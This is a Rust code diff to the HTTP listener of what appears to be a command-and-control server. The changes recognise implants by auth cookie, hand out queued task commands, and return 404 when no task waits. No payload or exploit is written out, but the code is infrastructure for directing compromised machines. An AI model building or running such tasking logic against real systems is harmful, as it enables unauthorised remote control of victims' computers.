@@ -29,7 +29,8 @@ fn handle_connection(mut stream: TcpStream, listener_id: u16)
     let mut buffer: [u8; 1024] = [0; 1024];
     stream.read(&mut buffer).unwrap();
 
-    let (http_response_headers, response_body_page_path) = prepare_http_response(buffer);
+    let (is_implant, implant_auth_cookie) = check_if_implant(buffer);
+    let (mut http_response_headers, response_body_page_path) = prepare_http_response(buffer, is_implant);
 
     let mut http_response_body = if Path::new(&response_body_page_path).exists()
     {
@@ -42,8 +43,6 @@ fn handle_connection(mut stream: TcpStream, listener_id: u16)
     else {
         vec![]
     };
-
-    let (is_implant, implant_auth_cookie) = check_if_implant(buffer);
 
     if is_implant
     {
@@ -72,12 +71,27 @@ fn handle_connection(mut stream: TcpStream, listener_id: u16)
             include_statuses.push(ImplantTaskStatus::Issued.to_string());
 
             let implant_tasks = database::get_implant_tasks("CookieHash", &implant_auth_cookie, include_statuses);
-            for task in implant_tasks
+            
+            if implant_tasks.len() == 0
             {
-                http_response_body = prepare_http_response_task_command(task.command);
-                
-                database::update_implant_task_status(task.id, ImplantTaskStatus::Pending);
-                break;
+                http_response_headers = "HTTP/1.1 404 Not Found\r\n\r\n".to_string();
+            }
+            else
+            {
+                for task in implant_tasks
+                {
+                    http_response_body = prepare_http_response_task_command(task.command);
+                    
+                    if ! database::update_implant_task_status(
+                        task.id, 
+                        ImplantTaskStatus::Pending
+                    )
+                    {
+                        println!("[!] Couldn't update the status of the task");
+                    }
+
+                    break;
+                }
             }
         }
     }
@@ -154,7 +168,10 @@ pub fn start_listener(listener_id: u16, rx: Receiver<ListenerSignal>)
     }
 }
 
-fn prepare_http_response(buffer: [u8; 1024]) -> (String, String)
+fn prepare_http_response(
+    buffer: [u8; 1024],
+    is_implant: bool
+) -> (String, String)
 {
     let get: &[u8; 6] = b"GET / ";
 
@@ -162,6 +179,11 @@ fn prepare_http_response(buffer: [u8; 1024]) -> (String, String)
     let error_page_path: String = (&CONFIG.listener.http.default_error_page_path).to_string();
     let ok_response_code: String = "HTTP/1.1 200 OK\r\n\r\n".to_string();
     let not_found_response_code: String = "HTTP/1.1 404 Not Found\r\n\r\n".to_string();
+
+    if is_implant
+    {
+        return (ok_response_code, String::new());
+    }
 
     if buffer.starts_with(get)
     {
